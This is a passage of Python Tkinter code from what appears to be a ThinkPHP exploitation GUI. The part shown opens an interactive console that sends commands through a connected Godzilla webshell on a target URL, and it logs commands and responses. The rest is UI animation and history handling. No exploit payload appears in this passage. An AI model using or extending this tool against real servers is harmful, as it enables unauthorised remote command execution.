        """启动交互式GodzillaShell，优化Windows 11下的拖动性能"""
        if not HAS_GODZILLA_MODULE or not self.godzilla_connected:
            self.log_error("请先连接GodzillaShell")
            return
            
        try:
            # 创建交互式Shell对话框
            from tkinter import simpledialog
            
            # 创建新窗口作为交互式Shell
            shell_window = tk.Toplevel(self.root)
            shell_window.title("Godzilla交互式Shell - {}".format(self.url_var.get()))
            shell_window.geometry("800x600")
            shell_window.configure(bg="#1A1A1A")
            
            # 添加对交互式窗口拖动的优化
            shell_window_is_dragging = [False]  # 使用列表作为可变对象
            
            def shell_start_drag(event):
                shell_window_is_dragging[0] = True
            
            def shell_stop_drag(event):
                shell_window_is_dragging[0] = False
            
            shell_window.bind("<Button-1>", shell_start_drag)
            shell_window.bind("<ButtonRelease-1>", shell_stop_drag)
            
            # 设置窗口图标（如果有）
            if hasattr(self, 'icon') and self.icon:
                shell_window.iconphoto(False, self.icon)
            
            # 创建输出文本框
            output_text = scrolledtext.ScrolledText(
                shell_window,
                font=(self.font_family, 10),
                bg="#000000",
                fg="#FFFFFF",
                insertbackground="#FFFFFF",
                relief=tk.FLAT,
                bd=1,
                highlightbackground="#333333"
            )
            output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            output_text.config(state=tk.DISABLED)
            
            # 配置文本标签样式
            output_text.tag_config("prompt", foreground="#4EC9B0", font=(self.font_family, 10))
            output_text.tag_config("command", foreground="#FFD700", font=(self.font_family, 10))
            output_text.tag_config("error", foreground="#FF0000", font=(self.font_family, 10))
            
            # 创建命令输入框
            cmd_frame = tk.Frame(shell_window, bg="#1A1A1A")
            cmd_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
            
            # 提示符标签
            prompt_label = tk.Label(
                cmd_frame,
                text="$ ",
                font=(self.font_family, 10),
                fg="#4EC9B0",
                bg="#000000"
            )
            prompt_label.pack(side=tk.LEFT, padx=(0, 5))
            
            # 命令输入框
            cmd_var = tk.StringVar()
            cmd_entry = tk.Entry(
                cmd_frame,
                textvariable=cmd_var,
                font=(self.font_family, 10),
                bg="#000000",
                fg="#FFFFFF",
                insertbackground="#FFFFFF",
                relief=tk.FLAT,
                bd=0,
                highlightthickness=0,
                width=500
            )
            cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
            
            # 命令历史记录
            command_history = []
            history_index = -1
            
            def execute_command(event=None):
                nonlocal history_index
                command = cmd_var.get().strip()
                if not command:
                    return
                    
                # 保存到历史记录
                if command not in command_history or command != command_history[-1]:
                    command_history.append(command)
                history_index = len(command_history)
                
                # 显示命令
                output_text.config(state=tk.NORMAL)
                output_text.insert(tk.END, "$ ", "prompt")
                output_text.insert(tk.END, command + "\n", "command")
                
                try:
                    # 退出命令处理
                    if command.lower() in ["exit", "quit", "bye"]:
                        output_text.insert(tk.END, "退出交互式Shell...\n", "info")
                        output_text.see(tk.END)
                        output_text.config(state=tk.DISABLED)
                        shell_window.destroy()
                        return
                        
                    # 执行命令
                    result = self.godzilla_shell.execute(command)
                    
                    # 显示结果
                    if result:
                        output_text.insert(tk.END, result + "\n")
                    else:
                        output_text.insert(tk.END, "命令执行成功，但无返回结果\n")
                    
                    # 保存到全局历史记录，添加[交互式shell]标识
                    self.save_command_history(f"[交互式shell] {command}", result, None, {
                        'url': self.url_var.get(),
                        'command': command,
                        'type': 'interactive_shell'
                    })
                    
                except Exception as e:
                    error_msg = "执行命令时发生错误: {}".format(str(e))
                    output_text.insert(tk.END, error_msg + "\n", "error")
                    
                    # 保存错误信息到全局历史记录
                    self.save_command_history(f"[交互式shell] {command}", error_msg, None, {
                        'url': self.url_var.get(),
                        'command': command,
                        'type': 'interactive_shell'
                    })
                
                # 滚动到底部并清空输入框
                output_text.see(tk.END)
                output_text.config(state=tk.DISABLED)
                cmd_var.set("")
                
            def show_previous_command(event):
                nonlocal history_index
                if command_history and history_index > 0:
                    history_index -= 1
                    cmd_var.set(command_history[history_index])
                    cmd_entry.icursor(tk.END)
                return "break"
                
            def show_next_command(event):
                nonlocal history_index
                if command_history and history_index < len(command_history) - 1:
                    history_index += 1
                    cmd_var.set(command_history[history_index])
                    cmd_entry.icursor(tk.END)
                elif command_history and history_index == len(command_history) - 1:
                    history_index += 1
                    cmd_var.set("")
                return "break"
                
            # 绑定事件
            cmd_entry.bind("<Return>", execute_command)
            cmd_entry.bind("<Up>", show_previous_command)
            cmd_entry.bind("<Down>", show_next_command)
            
            # 显示欢迎信息
            output_text.config(state=tk.NORMAL)
            output_text.insert(tk.END, "欢迎使用Godzilla交互式Shell！输入 'exit' 退出\n\n", "info")
            output_text.see(tk.END)
            output_text.config(state=tk.DISABLED)
            
            # 获取焦点
            cmd_entry.focus_set()
            
            # 窗口关闭事件
            def on_closing():
                output_text.config(state=tk.NORMAL)
                output_text.insert(tk.END, "退出交互式Shell...\n", "info")
                output_text.see(tk.END)
                output_text.config(state=tk.DISABLED)
                shell_window.destroy()
            
            shell_window.protocol("WM_DELETE_WINDOW", on_closing)
            
            # 禁止调整窗口大小
            shell_window.resizable(True, True)
            
            # 使窗口保持在最前
            # shell_window.attributes('-topmost', True)
        except Exception as e:
            self.log_error("启动交互式Shell时发生错误: {}".format(str(e)))
        
    def update_result(self, command, result, request_data=None):
        # 清空之前的结果
        self.result_text.delete(1.0, tk.END)
        
        # 添加命令信息
        self.result_text.insert(tk.END, f"执行命令: {command}\n", "info")
        self.result_text.insert(tk.END, "="*70 + "\n", "info")
        
        # 添加结果，使用正则表达式高亮关键字
        highlighted_lines = self.highlight_text(result)
        
        # 保存命令和回显到历史记录（包含高亮信息和请求数据）
        self.save_command_history(command, result, highlighted_lines, request_data)
        
    def highlight_text(self, text):
        # 将文本按行分割并插入
        lines = text.splitlines()
        highlighted_lines = []  # 存储每行的高亮信息
        
        for line in lines:
            # 高亮常见的关键字
            if re.search(r'(uid|gid|groups|root|admin|user)', line, re.IGNORECASE):
                self.result_text.insert(tk.END, line + "\n", "highlight")
                highlighted_lines.append((line, "highlight"))
            else:
                self.result_text.insert(tk.END, line + "\n")
                highlighted_lines.append((line, None))
        
        return highlighted_lines
        
    def show_error(self, error_message):
        # 清空之前的结果
        self.result_text.delete(1.0, tk.END)
        
        # 显示错误信息
        self.result_text.insert(tk.END, "发生错误:\n", "error")
        self.result_text.insert(tk.END, error_message, "error")
        
        # 显示错误对话框
        messagebox.showerror("执行错误", error_message)
        
    def reset_ui(self):
        # 恢复按钮状态
        self.execute_btn.config(state=tk.NORMAL)
        self.is_running = False
        self.status_var.set("执行完成")
        self.progress_var.set(100)
        
        # 2秒后重置进度条
        self.root.after(2000, lambda: self.progress_var.set(0))
        
    def clear_output(self):
        # 清空结果文本
        self.result_text.delete(1.0, tk.END)
        self.status_var.set("已清空输出")
        
    def on_window_resize(self, event):
        # 窗口大小变化时更新Canvas宽度
        try:
            # 获取当前Canvas的实际宽度
            new_width = self.warning_canvas.winfo_width()
            if new_width > 0:
                self.warning_width = new_width
            
            # 更新窗口尺寸信息
            self.window_width = event.width
            self.window_height = event.height
        except:
            pass
    
    def start_drag(self, event):
        # 开始拖动窗口时设置标志
        self.is_dragging = True
    
    def stop_drag(self, event):
        # 停止拖动窗口时重置标志
        self.is_dragging = False
            
    def rgb_animation(self):
        """在主线程中实现从左到右的RGB跑马灯效果，优化Windows 11下的性能"""
        if not self.is_running_rgb:
            return
        
        try:
            # 窗口拖动时减少动画更新频率以解决卡顿问题
            if self.is_dragging:
                # 拖动时降低更新频率
                self.root.after(200, self.rgb_animation)
                return
            
            # 确保Canvas宽度已设置
            current_width = self.warning_canvas.winfo_width()
            if current_width > 0:
                self.warning_width = current_width
            elif self.warning_width == 0:
                self.warning_width = 800  # 默认宽度
            
            # 更新RGB位置
            self.rgb_pos = (self.rgb_pos + 5) % 768
            
            # 清空画布
            self.warning_canvas.delete("all")
            
            # 优化：在Windows 11下减少绘制的像素密度
            if os.name == 'nt':  # Windows系统
                step = 2  # 每两个像素绘制一次，降低绘制复杂度
            else:
                step = 1
            
            # 创建从左到右的连续渐变色彩条
            for x in range(0, self.warning_width, step):
                # 使用现有的get_rgb_color函数获取颜色
                color_pos = (self.rgb_pos + x * 2) % 768
                r, g, b = get_rgb_color(color_pos)
                
                # 转换为十六进制颜色
                hex_color = '#{:02x}{:02x}{:02x}'.format(r, g, b)
                
                # 在画布上绘制一条垂直的彩色线条
                self.warning_canvas.create_line(x, 0, x, 3, fill=hex_color, width=step)
            
            # 更新进度条颜色（使用当前最左侧的颜色）
            left_color_pos = self.rgb_pos % 768
            left_rgb_color = get_rgb_color(left_color_pos)
            left_hex_color = rgb_to_hex(left_rgb_color)
            
            # 更新进度条颜色
            try:
                style = ttk.Style()
                style.configure("TProgressbar", troughcolor="#1A1A1A", background=left_hex_color)
            except:
                pass
            
            # 更新标题跑马灯效果
            self.update_title_animation()
        except Exception as e:
            pass
            
        # 继续下一次动画循环（在主线程中）
        # 优化：在Windows 11下适当降低动画频率
        interval = 30 if os.name == 'nt' else 20
        self.root.after(interval, self.rgb_animation)
        
    def update_title_animation(self):
        """更新标题的跑马灯效果"""
        try:
            # 更新标题的RGB位置
            self.title_rgb_pos = (self.title_rgb_pos + 2) % 768
            
            # 获取当前颜色
            rgb_color = get_rgb_color(self.title_rgb_pos)
            hex_color = rgb_to_hex(rgb_color)
            
            # 更新标题文本颜色
            self.title_label.config(fg=hex_color)
        except:
            pass
        
    def save_output(self):
        # 获取当前文本
        text = self.result_text.get(1.0, tk.END)
        if not text.strip():
            messagebox.showinfo("提示", "没有可保存的内容")
            return
        
        # 打开文件对话框
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")],
            title="保存输出结果"
        )
        
        if file_path:
            try:
                # 保存文件
                with open(file_path, "w", encoding="utf-8") as file:
                    file.write(text)
                self.status_var.set(f"结果已保存到: {file_path}")
                messagebox.showinfo("成功", "输出结果已成功保存")
            except Exception as e:
                messagebox.showerror("保存失败", f"无法保存文件: {str(e)}")
        
    def save_command_history(self, command, result, highlighted_lines=None, request_data=None):
        # 保存命令和回显到历史记录，保持一一对应
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        self.command_history.append({"command": command, "timestamp": timestamp})
        
        # 创建响应历史记录条目，包含请求数据
        response_entry = {
            "result": result,
            "timestamp": timestamp,
            "request_data": request_data  # 保存请求数据用于在回显历史中显示
        }
        
        # 如果提供了高亮信息，也保存高亮信息
        if highlighted_lines:
            response_entry["highlighted_lines"] = highlighted_lines
        
        self.response_history.append(response_entry)
        
        # 限制历史记录数量
        if len(self.command_history) > self.max_history_size:
            self.command_history.pop(0)
            self.response_history.pop(0)
    
    def show_response_history(self):
        # 创建回显记录对话框
        response_window = tk.Toplevel(self.root)
        response_window.title("回显记录")
        response_window.geometry("800x600")
        response_window.configure(bg="#1E1E1E")
        
        # 创建水平分割面板，使左右窗口可以调整大小
        paned_window = ttk.PanedWindow(response_window, orient=tk.HORIZONTAL)
        paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # 创建左侧框架用于显示命令列表
        left_frame = ttk.Frame(paned_window, width=400)
        paned_window.add(left_frame, weight=1)
        
        # 创建右侧框架用于显示回显结果
        right_frame = ttk.Frame(paned_window, width=400)
        paned_window.add(right_frame, weight=1)
        
        # 创建列表框显示历史命令
        command_listbox = tk.Listbox(
            left_frame,
            font=(self.font_family, 10),
            bg="#000000",
            fg="#FFFFFF",
            selectbackground="#FF0000",
            selectforeground="#FFFFFF"
        )
        command_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 添加命令列表垂直滚动条
        command_vscroll = tk.Scrollbar(command_listbox, orient="vertical", command=command_listbox.yview)
        command_vscroll.pack(side=tk.RIGHT, fill=tk.Y)
        command_listbox.config(yscrollcommand=command_vscroll.set)
        
        # 添加命令列表水平滚动条
        command_hscroll = tk.Scrollbar(left_frame, orient="horizontal", command=command_listbox.xview)
        command_hscroll.pack(fill=tk.X, padx=5)
        command_listbox.config(xscrollcommand=command_hscroll.set)
        command_listbox.config(exportselection=False)  # 防止选择冲突
        
        # 创建右侧的整体框架，包含顶部栏和回显文本框
        right_content_frame = tk.Frame(right_frame, bg="#1E1E1E")
        right_content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 创建顶部栏，用于显示请求数据
        # 创建一个包含顶栏和分隔条的框架
        request_info_container = tk.Frame(right_content_frame, bg="#1E1E1E")
        request_info_container.pack(fill=tk.X, pady=(0, 5))
        
        # 增加顶部栏的初始高度
        request_info_frame = tk.Frame(request_info_container, bg="#2D2D30", height=150)
        request_info_frame.pack(fill=tk.X)
        request_info_frame.pack_propagate(False)  # 防止框架大小被内容撑开
        
        # 创建请求信息文本框，设置为只读
        request_info_text = scrolledtext.ScrolledText(
            request_info_frame,
            font=(self.font_family, 9),
            bg="#000000",
            fg="#AAAAAA",
            wrap=tk.WORD,
            state=tk.DISABLED
        )
        request_info_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        request_info_text.tag_config("request_key", foreground="#4EC9B0")
        
        # 创建一个更宽的可拖拽区域，替代细窄的分隔条
        resize_bar = tk.Frame(request_info_container, bg="#444444", height=8, cursor="sizing")
        resize_bar.pack(fill=tk.X)
        
        # 添加视觉指示，让用户知道这是可拖拽的区域
        resize_line = tk.Frame(resize_bar, bg="#666666", height=2)
        resize_line.place(relx=0, rely=0.5, relwidth=1, anchor="n")
        
        # 使拖拽条可拖拽调整高度
        resize_bar.bind("<Button-1>", lambda event: start_resize(event, request_info_frame))
        
        # 拖拽调整高度的函数
        def start_resize(event, frame):
            # 获取初始位置
            start_y = event.y_root
            start_height = frame.winfo_height()
            
            def on_drag(event):
                # 计算新高度
                delta = event.y_root - start_y
                new_height = max(50, min(400, start_height + delta))  # 设置最小和最大高度限制
                frame.config(height=new_height)
                # 强制更新窗口布局
                request_info_container.update_idletasks()
                right_content_frame.update_idletasks()
                right_frame.update_idletasks()
                paned_window.update_idletasks()
            
            def stop_drag(event):
                # 解绑拖拽事件
                response_window.unbind("<Motion>")
                response_window.unbind("<ButtonRelease-1>")
            
            # 绑定拖拽事件
            response_window.bind("<Motion>", on_drag)
            response_window.bind("<ButtonRelease-1>", stop_drag)
        
        # 创建文本框显示对应的回显
        response_text = scrolledtext.ScrolledText(
            right_content_frame,
            font=(self.font_family, 10),
            bg="#000000",
            fg="#FFFFFF",
            wrap=tk.WORD
        )
        response_text.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        
        # 配置文本标签样式（与主窗口保持一致）
        response_text.tag_config("info", foreground="#4EC9B0", font=(self.font_family, 10))
        response_text.tag_config("highlight", foreground="#FFD700", font=(self.font_family, 10, "bold"))
        response_text.tag_config("error", foreground="#FF0000", font=(self.font_family, 10, "bold"))
        
        # 填充历史命令，最新的命令显示在顶部
        for item in reversed(self.command_history):
            display_text = f"[{item['timestamp']}] {item['command']}"
            command_listbox.insert(tk.END, display_text)
        
        # 选择命令时显示对应的回显和请求数据
        def on_command_select(event):
            index = command_listbox.curselection()
            if index:
                # 获取原始索引 - 因为command_listbox是反向显示的，所以需要转换回原始索引
                raw_index = len(self.command_history) - 1 - index[0]
                if 0 <= raw_index < len(self.response_history):
                    response_item = self.response_history[raw_index]
                    
                    # 显示回显结果
                    response_text.delete(1.0, tk.END)
                    response_text.insert(tk.END, f"[{response_item['timestamp']}]\n", "info")
                    response_text.insert(tk.END, "="*70 + "\n", "info")
                    
                    # 检查是否有高亮信息
                    if 'highlighted_lines' in response_item:
                        # 使用保存的高亮信息显示文本
                        for line, highlight_type in response_item['highlighted_lines']:
                            if highlight_type:
                                response_text.insert(tk.END, line + "\n", highlight_type)
                            else:
                                response_text.insert(tk.END, line + "\n")
                    else:
                        # 没有高亮信息，只显示原始文本
                        response_text.insert(tk.END, response_item['result'])
                    
                    # 显示请求数据在顶部栏
                    request_info_text.config(state=tk.NORMAL)
                    request_info_text.delete(1.0, tk.END)
                    
                    if 'request_data' in response_item and response_item['request_data']:
                        request_data = response_item['request_data']
                        
                        # 添加URL信息
                        request_info_text.insert(tk.END, "请求URL: ", "request_key")
                        request_info_text.insert(tk.END, request_data.get('url', '') + "\n")
                        
                        # 添加命令信息
                        request_info_text.insert(tk.END, "执行命令: ", "request_key")
                        request_info_text.insert(tk.END, request_data.get('command', '') + "\n")
                        
                        # 添加请求数据
                        if 'data' in request_data:
                            request_info_text.insert(tk.END, "请求数据: ", "request_key")
                            request_info_text.insert(tk.END, request_data['data'] + "\n")
                        
                        # 添加请求头（可以选择只显示关键的头信息）
                        if 'headers' in request_data:
                            request_info_text.insert(tk.END, "关键请求头: \n", "request_key")
                            important_headers = ['Host', 'Content-Type', 'User-Agent']
                            for header in important_headers:
                                if header in request_data['headers']:
                                    request_info_text.insert(tk.END, f"  {header}: ", "request_key")
                                    request_info_text.insert(tk.END, request_data['headers'][header] + "\n")
                    
                    request_info_text.config(state=tk.DISABLED)
        
        command_listbox.bind("<<ListboxSelect>>", on_command_select)
        
        # 添加清空历史按钮
        button_frame = tk.Frame(response_window, bg="#1E1E1E")
        button_frame.pack(fill=tk.X, pady=(0, 10))
        
        clear_response_btn = tk.Button(
            button_frame,
            text="清空记录",
            font=(self.font_family, 10),
            bg="#333333",
            fg="#CCCCCC",
            relief=tk.RAISED,
            bd=2,
            cursor="hand2",
            command=lambda: [self.response_history.clear(), self.command_history.clear(), 
                            command_listbox.delete(0, tk.END), response_text.delete(1.0, tk.END)]
        )
        clear_response_btn.pack(side=tk.RIGHT, padx=10)
        
        # 使用强制方法确保分隔面板正确显示
        # 1. 首先强制显示窗口
        response_window.update()
        
        # 2. 设置一个小延迟来确保窗口完全初始化
        def set_sash_position():
            # 强制更新窗口布局
            response_window.update_idletasks()
            
            # 获取窗口实际宽度
            window_width = response_window.winfo_width()
            
            # 确保分隔条位置设置合理
            if window_width > 0:
                # 设置分隔条位置为窗口宽度的一半
                sash_position = window_width // 2
                paned_window.sashpos(0, sash_position)
            else:
                # 如果无法获取窗口宽度，使用默认值
                paned_window.sashpos(0, 400)
        
        # 使用after来确保在窗口完全初始化后设置分隔条位置
        response_window.after(10, set_sash_position)

# 主函数
if __name__ == "__main__":
    root = tk.Tk()
    app = ThinkPHPExploitGUI(root)
    root.mainloop()